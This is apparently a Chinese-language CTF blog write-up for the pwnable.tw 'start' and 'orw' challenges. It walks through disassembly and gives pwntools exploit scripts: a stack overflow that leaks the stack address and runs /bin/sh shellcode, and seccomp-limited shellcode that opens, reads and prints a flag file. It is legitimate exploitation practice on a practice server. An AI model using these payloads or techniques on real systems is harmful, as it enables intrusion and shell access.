---
title: pwnable尝试
author: ch3n9w
typora-root-url: ../
date: 2022-01-27 17:48:33
categories:
  - CTF
---

尝试学pwn,放弃学pwn

<!--more-->

## start

下载, 反编译获得如下代码

```
.text:08048060                 public _start
.text:08048060 _start          proc near               ; DATA XREF: LOAD:08048018↑o
.text:08048060                 push    esp
.text:08048061                 push    offset _exit
.text:08048066                 xor     eax, eax
.text:08048068                 xor     ebx, ebx
.text:0804806A                 xor     ecx, ecx
.text:0804806C                 xor     edx, edx
.text:0804806E                 push    ':FTC'
.text:08048073                 push    ' eht'
.text:08048078                 push    ' tra'
.text:0804807D                 push    'ts s'
.text:08048082                 push    2774654Ch
.text:08048087                 mov     ecx, esp        ; addr
.text:08048089                 mov     dl, 14h         ; len
.text:0804808B                 mov     bl, 1           ; fd
.text:0804808D                 mov     al, 4
.text:0804808F                 int     80h             ; LINUX - sys_write
.text:08048091                 xor     ebx, ebx
.text:08048093                 mov     dl, 3Ch ; '<'
.text:08048095                 mov     al, 3
.text:08048097                 int     80h             ; LINUX -
.text:08048099                 add     esp, 14h
.text:0804809C                 retn
.text:0804809C _start          endp ; sp-analysis failed
```

1. esp压栈, 返回地址压栈
2. 清空了eax, ebx, ecx, edx
3. 四次push压入字符串 Let’s start the CTF :
4. 将栈顶地址作为参数移到ecx中
5. 将20移到dl (edx的低八位)中, 20 就是上面字符串的长度
6. sys_write将要向stdout写入, 所以将1移动到bl (ebx的低8位)中
7. 因为要调用的系统调用为sys_write, 所以将其系统呼叫号也就是4移动到al (eax的低八位)中
8. 使用 int 80h 来调用中断, 相当于call, 参数为前面的那些, 至此标准输出中写入了字符串
9. ebx置0, 表示从标准输入中读取
10. 将60传入edx, 表示读取60个字节 (注意这些字节会覆盖原先栈中的字符串)
11. 系统呼叫号置3, 表示使用sys_read调用
12. int 80h来调用中断, 将内容读入ecx中的地址也就是栈顶中
13. 将esp增加20字节
14. 弹栈并执行弹出地址所指向的指令

攻击思路为:

- 程序向栈中写入数据, 然后再将esp增加20然后弹栈执行, 但是我们读取的数据最大有60字节, 那么可以读入超过20字节的数据, 并控制弹栈执行的指令. 如果让弹出执行的指令为sys_write部分的代码, 那么就会泄漏最开始压栈的esp地址
- 泄漏esp地址之后, 进行第二次攻击, 同样是弹出执行sys_write, 接着代码继续执行到sys_read, 这里让程序读入20个垃圾字符, 接下来程序会将esp增加20, 然后再次弹栈执行, 这次弹栈出来要执行的指令的地址 应该是shellcode的地址, 那么shellcode的地址应该是多少呢? 应该是最开始的esp地址加上20, 这里我第一次看的时候想了好久, 可以看这位师傅的图帮助理解https://xuanxuanblingbling.github.io/ctf/pwn/2019/08/30/start/

exp如下

```
from pwn import *
p = remote('chall.pwnable.tw', 10000)
# p = process('./start')
shellcode= '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'

pad = 'a'*20
# pad = pad.decode('utf8')
addr = 0x8048087
payload1 = pad + p32(addr).decode('unicode_escape')
p.send(payload1)
p.recvuntil(":")
oldesp = u32(p.recv(4))
shellcode_addr = oldesp + 20
payload2 = pad + p32(shellcode_addr).decode('unicode_escape') + shellcode
p.send(payload2)
p.interactive()
```

## orw

逆向得到源代码

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  orw_seccomp();
  printf("Give my your shellcode:");
  read(0, &shellcode, 0xC8u);
  ((void (*)(void))shellcode)();
  return 0;
}
```

orw_seccomp 说是限制执行的函数的, 题目说只能执行sys_open sys_read sys_write. 然后接下来程序读取了shellcode并且执行. 所以向程序发送asm代码, 先对flag文件使用sys_open, 然后用sys_read读取内容, 最后使用sys_write 将内容写到标准输出中.

```python
from pwn import *
context(arch='i386',os='linux')
#context(log_level='debug')
io = remote('chall.pwnable.tw',10001)
open_code = '''
mov eax, 0x5; 
push 0x00006761; 
push 0x6c662f77; 
push 0x726f2f65; 
push 0x6d6f682f; 
mov ebx,esp; 
xor ecx,ecx; 
xor edx,edx; 
int 0x80;
'''
read_code = '''
mov ecx, ebx; 
mov ebx, eax;
mov eax, 0x3; 
mov edx, 0x60; 
int 0x80;
'''
write_code = '''
mov eax, 0x4; 
mov ebx, 0x1; 
int 0x80;
'''
payload = asm(open_code+read_code+write_code)
io.recvuntil(':')
io.send(payload)
io.interactive()
```

